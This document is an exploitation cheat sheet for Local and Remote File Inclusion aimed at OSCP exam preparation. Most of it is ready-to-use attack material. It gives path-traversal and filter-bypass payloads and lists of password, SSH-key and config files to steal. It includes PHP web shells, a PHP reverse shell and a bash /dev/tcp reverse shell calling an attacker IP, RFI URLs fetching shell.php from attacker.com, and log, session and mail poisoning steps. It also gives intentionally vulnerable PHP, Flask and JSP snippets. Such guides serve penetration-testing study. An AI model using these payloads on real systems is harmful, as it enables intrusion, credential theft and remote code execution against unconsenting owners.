# Local File Inclusion (LFI) & Remote File Inclusion (RFI) Exploitation Guide

## Table of Contents
1. [LFI/RFI Basics](#lfirfi-basics)
2. [Local File Inclusion (LFI)](#local-file-inclusion-lfi)
3. [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
4. [LFI to RCE Techniques](#lfi-to-rce-techniques)
5. [Filter Bypass Techniques](#filter-bypass-techniques)
6. [OS-Specific Payloads](#os-specific-payloads)
7. [OSCP Scenarios](#oscp-scenarios)
8. [Tools and Automation](#tools-and-automation)

---

## LFI/RFI Basics

### What is LFI?
**Local File Inclusion** allows attackers to include local files from the server's filesystem, potentially exposing sensitive data or leading to RCE.

### What is RFI?
**Remote File Inclusion** allows attackers to include remote files from external servers, typically leading to direct RCE.

### Vulnerable Code Examples

#### PHP
```php
<?php
$file = $_GET['page'];
include($file);
?>

// Example URL: http://target.com/index.php?page=about.php
// Attack: http://target.com/index.php?page=../../../../etc/passwd
```

#### Python Flask
```python
@app.route('/read')
def read_file():
    filename = request.args.get('file')
    with open(filename, 'r') as f:
        return f.read()
```

#### JSP
```jsp
<%
String file = request.getParameter("page");
%>
<jsp:include page="<%= file %>" />
```

### Impact
- **Sensitive file disclosure** (credentials, source code)
- **Remote Code Execution**
- **Session hijacking**
- **Privilege escalation**

---

## Local File Inclusion (LFI)

### Basic LFI Payloads

#### Linux Path Traversal
```
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

#### Windows Path Traversal
```
..\..\windows\win.ini
..\..\..\windows\win.ini
..\..\..\..\windows\win.ini
..\..\..\..\..\windows\win.ini

# Forward slashes also work on Windows
../../windows/win.ini
../../../windows/win.ini
```

#### URL Encoding
```
# Single encoding
..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2Fwindows%2Fwin.ini

# Double encoding
..%252F..%252F..%252Fetc%252Fpasswd
```

#### Absolute Paths
```
# Linux
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/var/www/html/config.php

# Windows
C:\windows\win.ini
C:\boot.ini
C:\inetpub\wwwroot\web.config
c:/windows/win.ini  # Forward slashes
```

### Common Linux Files to Target

#### System Files
```
/etc/passwd                    # User accounts
/etc/shadow                    # Password hashes (if readable)
/etc/group                     # Groups
/etc/hosts                     # Host mappings
/etc/hostname                  # System hostname
/etc/issue                     # OS info
/etc/os-release                # Detailed OS info
/proc/version                  # Kernel version
/proc/self/environ             # Environment variables
/proc/self/cmdline             # Current process command line
/proc/self/cwd/index.php       # Current working directory files
/proc/[PID]/cmdline            # Specific process info
```

#### Web Application Files
```
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/wp-config.php    # WordPress
/var/www/html/.env             # Laravel, Node.js
/usr/share/nginx/html/config.php
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/httpd/conf/httpd.conf
```

#### SSH Keys
```
/home/user/.ssh/id_rsa
/home/user/.ssh/id_dsa
/home/user/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
```

#### Logs (potential for log poisoning)
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/syslog
/var/log/mail.log
/var/log/vsftpd.log
```

#### Database Credentials
```
/var/www/html/config/database.php
/var/www/html/application/config/database.php
/var/www/html/wp-config.php
/var/www/html/.env
```

#### Shell History
```
/home/user/.bash_history
/home/user/.zsh_history
/root/.bash_history
/root/.mysql_history
```

### Common Windows Files to Target

#### System Files
```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\boot.ini
C:\windows\system.ini
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\repair\sam
C:\windows\repair\system
```

#### Web Application Files
```
C:\inetpub\wwwroot\web.config
C:\xampp\htdocs\config.php
C:\xampp\apache\conf\httpd.conf
C:\wamp\www\config.php
C:\wamp\bin\apache\apache2.4.x\conf\httpd.conf
```

#### Application Files
```
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\my.cnf
```

---

## Remote File Inclusion (RFI)

### Basic RFI Payloads

#### Direct PHP Shell Inclusion
```
http://target.com/index.php?page=http://attacker.com/shell.php
http://target.com/index.php?page=http://attacker.com/shell.txt
```

#### With Null Byte (PHP < 5.3)
```
http://target.com/index.php?page=http://attacker.com/shell.txt%00
```

#### Simple PHP Shell (shell.php)
```php
<?php system($_GET['cmd']); ?>
```

**Usage:**
```
http://target.com/index.php?page=http://attacker.com/shell.php&cmd=whoami
```

### Testing RFI

#### Test Payload
```php
<?php phpinfo(); ?>
```

Host on attacker server:
```bash
# Create test.php
echo "<?php phpinfo(); ?>" > test.php

# Start HTTP server
python3 -m http.server 80

# Test RFI
http://target.com/index.php?page=http://10.10.14.5/test.php
```

### RFI to RCE

#### Web Shell
```php
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

#### Reverse Shell
```php
<?php
$sock = fsockopen("10.10.14.5", 443);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

**Attack Flow:**
```bash
1. Host shell.php on attacker server (port 80)
2. Start reverse shell listener: nc -nlvp 443
3. Trigger RFI: http://target.com/index.php?page=http://10.10.14.5/shell.php
4. Receive reverse shell
```

---

## LFI to RCE Techniques

### 1. Log Poisoning (Apache/Nginx)

#### Poison Apache Access Log
```bash
# Step 1: Inject PHP code via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include access log
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami

# Step 3: Execute commands
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
```

#### Poison via Referer Header
```bash
curl -H "Referer: <?php system(\$_GET['cmd']); ?>" http://target.com/

http://target.com/index.php?page=../../../../var/log/nginx/access.log&cmd=whoami
```

### 2. SSH Log Poisoning

#### Poison /var/log/auth.log
```bash
# Step 1: SSH with PHP payload as username
ssh '<?php system($_GET['cmd']); ?>'@target.com

# This fails but logs the payload in /var/log/auth.log

# Step 2: Include log file
http://target.com/index.php?page=../../../../var/log/auth.log&cmd=whoami
```

### 3. Mail Log Poisoning (/var/log/mail.log)

#### Send Email with PHP Payload
```bash
# Connect to SMTP
telnet target.com 25

MAIL FROM:<attacker@evil.com>
RCPT TO:<?php system($_GET['cmd']); ?>@target.com
DATA
Subject: test
test
.
QUIT

# Include mail log
http://target.com/index.php?page=../../../../var/log/mail.log&cmd=whoami
```

### 4. PHP Session Files

#### Session File Location
```
/var/lib/php/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
```

#### Poison Session
```php
# Visit page and set cookie
# Inject PHP into session variable via vulnerable input

# Example:
http://target.com/profile.php?name=<?php system($_GET['cmd']); ?>

# Include session file
http://target.com/index.php?page=../../../../tmp/sess_abc123&cmd=whoami
```

### 5. /proc/self/environ

#### Inject via User-Agent
```bash
# Send request with PHP payload in User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Include environ
http://target.com/index.php?page=../../../../proc/self/environ&cmd=whoami
```

### 6. PHP Filter Chains (Advanced)

#### Read PHP Source Code
```
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
```

Decode the base64 output to view source code

#### Write PHP Code via php://input
```bash
# POST data to include as PHP code
curl -X POST --data "<?php system('whoami'); ?>" "http://target.com/index.php?page=php://input"
```

### 7. Data Wrapper

#### Embed PHP Code in Data URI
```
http://target.com/index.php?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=whoami

# Base64 encoded
http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=whoami
```

### 8. Expect Wrapper (if enabled)
```
http://target.com/index.php?page=expect://whoami
http://target.com/index.php?page=expect://id
```

### 9. Zip Wrapper Upload
```bash
# Create PHP shell
echo '<?php system($_GET['cmd']); ?>' > shell.php

# Zip it
zip shell.zip shell.php

# Upload via file upload (if available)
# Include it
http://target.com/index.php?page=zip://uploads/shell.zip%23shell&cmd=whoami
```

### 10. Phar Deserialization (Advanced)
```php
# Create phar file with serialized object
# Upload phar
# Trigger via phar:// wrapper
http://target.com/index.php?page=phar://uploads/exploit.phar/shell&cmd=whoami
```

---

## Filter Bypass Techniques

### Null Byte Injection (PHP < 5.3)
```
http://target.com/index.php?page=../../../../etc/passwd%00

# Bypasses appended extensions
# If code does: include($_GET['page'] . ".php");
# Null byte terminates string before .php
```

### Dot Truncation (PHP < 5.3)
```
http://target.com/index.php?page=../../../../etc/passwd..................................................................

# Very long string truncates after certain length
```

### Encoding Bypasses

#### URL Encoding
```
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Double Encoding
```
..%252F..%252F..%252Fetc%252Fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

#### Unicode Encoding
```
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```

### Directory Bypass

#### If "../" is Filtered
```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

#### If "etc/passwd" is Filtered
```
/e??/p??swd
/etc/./passwd
/etc/passwd/.
```

### Case Sensitivity
```
../ETC/passwd
../eTc/PaSsWd
```

### Wrapper Bypass

#### php://filter
```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=index.php
```

### Path Truncation
```
# Add excessive path length
../../../../etc/passwd/././././././././.[repeat]
```

---

## OS-Specific Payloads

### Linux Detailed Targets

#### Configuration Files
```
/etc/passwd
/etc/shadow
/etc/group
/etc/hosts
/etc/resolv.conf
/etc/sysconfig/network
/etc/networks
/etc/fstab
/etc/crontab
/etc/sudoers
```

#### Application Logs
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/auth.log
/var/log/daemon.log
/var/log/syslog
/var/log/mail.log
/var/log/kern.log
/var/log/mysql/error.log
/var/log/postgresql/postgresql.log
```

#### Web Shells Common Locations
```
/var/www/html/
/usr/share/nginx/html/
/var/www/
/srv/www/htdocs/
```

### Windows Detailed Targets

#### System Files
```
C:\boot.ini
C:\autoexec.bat
C:\config.sys
C:\windows\system.ini
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\system32\config\sam
C:\windows\system32\config\system
C:\windows\system32\config\security
```

#### IIS Logs
```
C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\System32\LogFiles\W3SVC1\
```

#### Application Files
```
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\wamp\logs\apache_error.log
C:\Program Files\Apache Group\Apache\logs\access.log
```

---

## OSCP Scenarios

### Scenario 1: LFI to SSH Key Extraction
```bash
# Step 1: Enumerate users from /etc/passwd
http://target.com/index.php?page=../../../../etc/passwd

# Users found: john, admin, root

# Step 2: Try to read SSH private keys
http://target.com/index.php?page=../../../../home/john/.ssh/id_rsa
http://target.com/index.php?page=../../../../home/admin/.ssh/id_rsa
http://target.com/index.php?page=../../../../root/.ssh/id_rsa

# Step 3: Save key and use
chmod 600 id_rsa
ssh -i id_rsa john@target.com
```

### Scenario 2: LFI to Log Poisoning RCE
```bash
# Step 1: Poison Apache access log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include log file and execute commands
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami

# Step 3: Get reverse shell
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# Listener
nc -nlvp 443
```

### Scenario 3: RFI to Direct RCE
```bash
# Step 1: Create reverse shell
cat > shell.php << 'EOF'
<?php
$sock = fsockopen("10.10.14.5", 443);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
EOF

# Step 2: Host shell
python3 -m http.server 80

# Step 3: Start listener
nc -nlvp 443

# Step 4: Trigger RFI
http://target.com/index.php?page=http://10.10.14.5/shell.php
```

### Scenario 4: LFI to Credential Disclosure
```bash
# Read WordPress config
http://target.com/index.php?page=../../../../var/www/html/wp-config.php

# Find credentials:
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'P@ssw0rd123');

# Try password reuse for SSH
ssh wpuser@target.com
Password: P@ssw0rd123
```

### Scenario 5: PHP Filter for Source Code
```bash
# Read config.php source (not executed)
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config.php

# Decode output
echo "base64_output" | base64 -d

# Extract credentials from source
```

---

## Testing Checklist

### LFI Testing
- [ ] Test with basic payloads: `../../../../etc/passwd`
- [ ] Try Windows files: `../../../../windows/win.ini`
- [ ] Test null byte: `../../../../etc/passwd%00`
- [ ] Test PHP wrappers: `php://filter/convert.base64-encode/resource=`
- [ ] Test data wrapper: `data://text/plain,<?php phpinfo(); ?>`
- [ ] Test expect wrapper: `expect://id`
- [ ] Try encoding: URL, double URL, unicode
- [ ] Test bypass techniques: `....//`, `..././`
- [ ] Check for log files
- [ ] Test /proc/self/environ

### RFI Testing
- [ ] Test basic RFI: `http://attacker.com/shell.php`
- [ ] Test with null byte: `http://attacker.com/shell.txt%00`
- [ ] Verify allow_url_include: phpinfo()
- [ ] Host test file on HTTP server
- [ ] Try different file extensions: .txt, .php, .jpg
- [ ] Test with IP vs domain
- [ ] Test HTTPS if HTTP fails

### LFI to RCE
- [ ] Test log poisoning (access.log, error.log, auth.log)
- [ ] Test session file inclusion
- [ ] Test /proc/self/environ
- [ ] Test php://input with POST data
- [ ] Test data:// wrapper
- [ ] Test file upload + inclusion
- [ ] Test zip:// wrapper

---

## Tools and Automation

### LFI/RFI Testing Tools

#### LFISuite
```bash
git clone https://github.com/D35m0nd142/LFISuite
cd LFISuite
python3 lfisuite.py

# Automated LFI testing and exploitation
```

#### Kadimus
```bash
git clone https://github.com/P0cL4bs/Kadimus
cd Kadimus
make

./kadimus -u "http://target.com/index.php?page=test"
```

#### Burp Suite Intruder
```
# Use SecLists wordlists
/usr/share/seclists/Fuzzing/LFI/
```

#### FFUF
```bash
# Fuzz for LFI
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://target.com/index.php?page=FUZZ
```

### Wordlists
```
/usr/share/seclists/Fuzzing/LFI/
/usr/share/wordlists/dirbuster/
```

---

## Quick Reference

### Quick LFI Test (Linux)
```
../../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
```

### Quick LFI Test (Windows)
```
../../../../windows/win.ini
../../../../boot.ini
```

### Quick RFI Test
```
http://target.com/index.php?page=http://10.10.14.5/shell.php
```

### Quick Log Poisoning
```bash
# Poison
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Execute
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
```

### Quick php://input RCE
```bash
curl -X POST --data "<?php system('whoami'); ?>" "http://target.com/index.php?page=php://input"
```

---

## OSCP Exam Tips

1. **Always test for LFI** on any page parameter
2. **Check phpinfo()** for allow_url_include (RFI possible)
3. **Try /etc/passwd first** - quick win indicator
4. **Use php://filter** to read source code without execution
5. **Log poisoning is common** in OSCP labs
6. **Combine with other vulns** - LFI → creds → SSH
7. **Document file paths carefully** - need exact paths for exploit

---

**Remember**: LFI can lead to sensitive information disclosure and RCE. RFI almost always leads to RCE. Both are critical vulnerabilities to test thoroughly!
